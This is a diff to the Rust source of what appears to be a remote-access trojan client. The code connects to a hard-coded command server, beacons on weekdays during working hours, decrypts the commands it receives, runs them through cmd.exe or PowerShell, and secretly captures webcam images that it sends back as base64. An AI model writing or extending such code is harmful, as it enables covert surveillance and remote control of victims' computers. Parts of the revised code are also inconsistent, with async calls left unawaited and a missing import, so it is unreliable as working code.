@@ -1,30 +1,26 @@
 use std::net::TcpStream;
-use std::io::{Read, Write};
-use std::process::{Command, Stdio};
-use std::fs::{File, remove_file};
-use std::time::{Duration, SystemTime, UNIX_EPOCH};
+use std::io::{Read, Cursor};
+use std::process::Command;
+use std::fs::{File, create_dir};
+use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
 use std::thread;
 use std::sync::{Arc, Mutex};
-use rand::{Rng, RngCore};
+use rand::Rng;
+use screenshots::Screen;
+use image::{ImageBuffer, Rgb};
+use chrono::Local;
 use sha2::{Sha256, Digest, Sha512};
+use pbkdf2::pbkdf2_hmac;
 use aes_gcm::{Aes256Gcm, Key, Nonce};
-use aes_gcm::aead::{Aead, NewAead};
 use base64::{encode, decode};
 use sysinfo::{System, SystemExt};
-use pbkdf2::pbkdf2_hmac;
-use hmac::Hmac;
-use tokio::net::TcpStream;
-use tokio::time::{interval, Duration};
-use tokio::process::Command as TokioCommand;
-use image::{ImageBuffer, Rgb};
-use nokhwa::{Camera, CaptureAPIBackend, utils::CameraIndex, pixel_format::RgbFormat};
-use chrono::Timelike;
+use opencv::{core, highgui, imgcodecs, prelude::*, videoio};
 
 // Constants
 const CVER: &str = "0.2.0";
 const TYPE: &str = "rust";
 const CHUNK_SIZE: usize = 1024;
-const SERVER_ADDRESS: &str = "localhost";
+const SERVER_ADDRESS: &str = "10.0.0.29";
 const SERVER_PORT: u16 = 54678;
 const MAX_RETRIES: u32 = 5;
 const RETRY_INTERVALS: [u64; 6] = [
@@ -191,32 +187,38 @@ fn format_file_name(name: &str, extension: &str) -> String {
 }
 
 async fn run_webcam_clip() -> Result<(), Box<dyn std::error::Error>> {
+    // Set the file name for saving the image
     let file_name = format_file_name("wc", "jpg");
-    
-    let mut camera = Camera::new(
-        CameraIndex::Index(0),
-        None,
-        None,
-        RgbFormat::RGB8,
-        30,
-        CaptureAPIBackend::Auto,
-    )?;
 
-    camera.open_stream()?;
-    let frame = camera.frame()?;
-    let image: ImageBuffer<Rgb<u8>, Vec<u8>> = ImageBuffer::from_raw(
-        frame.width() as u32,
-        frame.height() as u32,
-        frame.buffer().to_vec(),
-    ).ok_or("Failed to create image buffer")?;
+    // Open the default camera (index 0)
+    let mut camera = videoio::VideoCapture::new(0, videoio::CAP_ANY)?;
 
+    // Check if the camera opened successfully
+    if !camera.is_opened()? {
+        return Err("Failed to open camera".into());
+    }
+
+    // Capture a single frame
+    let mut frame = Mat::default();
+    camera.read(&mut frame)?;
+
+    // Check if the frame is empty
+    if frame.empty()? {
+        return Err("Failed to capture frame".into());
+    }
+
+    // Encode the frame as JPEG
     let mut buf = Vec::new();
-    image.write_to(&mut std::io::Cursor::new(&mut buf), image::ImageOutputFormat::Jpeg(100))?;
+    imgcodecs::imencode(".jpg", &frame, &mut buf, &core::Vector::new())?;
 
+    // Convert the image buffer to base64
+    let encoded_image = base64::encode(&buf);
+
+    // Send the command (assuming send_command is defined elsewhere)
     send_command(serde_json::json!({
         "response": {
             "download": file_name,
-            "data": base64::encode(&buf)
+            "data": encoded_image
         }
     })).await?;
 
@@ -249,7 +251,7 @@ async fn run_command(command: &str, payload: &str, is_file: bool) -> Result<Stri
         return Err("Unsupported command.".into());
     }
 
-    let mut cmd = TokioCommand::new(if command == "cmd" { "cmd.exe" } else { "powershell.exe" });
+    let mut cmd = Command::new(if command == "cmd" { "cmd.exe" } else { "powershell.exe" });
 
     match command {
         "cmd" => {
@@ -346,49 +348,48 @@ async fn parse_action(action: &str) -> Result<(), Box<dyn std::error::Error>> {
     Ok(())
 }
 
-async fn connect_to_server() -> Result<(), Box<dyn std::error::Error>> {
+fn connect_to_server() -> Result<(), Box<dyn std::error::Error>> {
     let mut retry_count = 0;
 
     loop {
-        match TcpStream::connect((SERVER_ADDRESS, SERVER_PORT)).await {
-            Ok(stream) => {
+        match TcpStream::connect((SERVER_ADDRESS, SERVER_PORT)) {
+            Ok(mut stream) => {
                 log_it("Client connected");
-                *CLIENT.lock().unwrap() = Some(stream);
+                *CLIENT.lock().unwrap() = Some(stream.try_clone()?);
 
                 let session_id = get_session_id(&CLIENT.lock().unwrap().as_ref().unwrap())?;
                 *SESSION_ID.lock().unwrap() = Some(session_id);
 
-                send_beacon().await?;
+                send_beacon()?;
 
                 let beacon_interval = rand::thread_rng().gen_range(BEACON_MIN_INTERVAL..=BEACON_MAX_INTERVAL);
-                let mut interval = interval(Duration::from_millis(beacon_interval));
+                let start_time = Instant::now();
 
                 loop {
-                    tokio::select! {
-                        _ = interval.tick() => {
-                            let now = chrono::Local::now();
-                            if now.weekday().num_days_from_monday() < 5 && (7..=19).contains(&now.hour()) {
-                                send_beacon().await?;
-                            }
+                    if start_time.elapsed().as_millis() >= beacon_interval as u128 {
+                        let now = Local::now();
+                        if now.weekday().num_days_from_monday() < 5 && (7..=19).contains(&now.hour()) {
+                            send_beacon()?;
                         }
-                        result = CLIENT.lock().unwrap().as_mut().unwrap().read(&mut [0; 1024]) => {
-                            match result {
-                                Ok(0) => {
-                                    log_it("Connection closed by server");
-                                    break;
-                                }
-                                Ok(n) => {
-                                    let data = String::from_utf8_lossy(&buffer[..n]);
-                                    log_it(&format!("Received data: {}", data));
-                                    let session_id = SESSION_ID.lock().unwrap().clone().unwrap();
-                                    let decrypted = decrypt_data(&data, &session_id)?;
-                                    parse_action(&decrypted).await?;
-                                }
-                                Err(e) => {
-                                    log_it(&format!("Error reading from socket: {}", e));
-                                    break;
-                                }
-                            }
+                        break;
+                    }
+
+                    let mut buffer = [0; 1024];
+                    match stream.read(&mut buffer) {
+                        Ok(0) => {
+                            log_it("Connection closed by server");
+                            break;
+                        }
+                        Ok(n) => {
+                            let data = String::from_utf8_lossy(&buffer[..n]);
+                            log_it(&format!("Received data: {}", data));
+                            let session_id = SESSION_ID.lock().unwrap().clone().unwrap();
+                            let decrypted = decrypt_data(&data, &session_id)?;
+                            parse_action(&decrypted)?;
+                        }
+                        Err(e) => {
+                            log_it(&format!("Error reading from socket: {}", e));
+                            break;
                         }
                     }
                 }
@@ -401,23 +402,27 @@ async fn connect_to_server() -> Result<(), Box<dyn std::error::Error>> {
                 log_it(&format!("Failed to connect: {}", e));
                 if retry_count >= MAX_RETRIES {
                     log_it("Max retries reached. Exiting.");
-                    sleep(BEACON_MAX_INTERVAL * 8);
+                    thread::sleep(Duration::from_millis(BEACON_MAX_INTERVAL * 8));
                     return Ok(());
                 }
                 let retry_interval = get_retry_interval(retry_count as usize);
                 log_it(&format!("Retrying in {} seconds...", retry_interval / 1000));
-                sleep(retry_interval);
+                thread::sleep(Duration::from_millis(retry_interval));
                 retry_count += 1;
             }
         }
     }
 }
 
-#[tokio::main]
-async fn main() -> Result<(), Box<dyn std::error::Error>> {
+fn main() -> Result<(), Box<dyn std::error::Error>> {
     if LOGGING {
-        *LOG_STREAM.lock().unwrap() = Some(File::create("logs/client.log")?);
+        let logs_dir = Path::new("logs");
+        if !logs_dir.exists() {
+            create_dir(logs_dir)?;
+        }
+        let log_file = logs_dir.join("client.log");
+        *LOG_STREAM.lock().unwrap() = Some(File::create(log_file)?);
     }
 
-    connect_to_server().await
+    connect_to_server()
 }
